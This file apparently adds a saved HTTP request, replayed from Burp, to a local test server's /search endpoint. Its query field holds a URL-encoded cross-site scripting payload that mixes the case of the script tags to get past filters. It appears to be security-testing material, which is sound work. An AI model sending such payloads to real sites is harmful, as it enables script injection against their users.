@@ -1,0 +1,9 @@
+POST /search HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: Mozilla/5.0 (Burp-Replay-SecTest)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 46
+Connection: close
+
+query=%3CsCrIpT%3Eprompt%281%29%3C%2FsCrIpT%3E
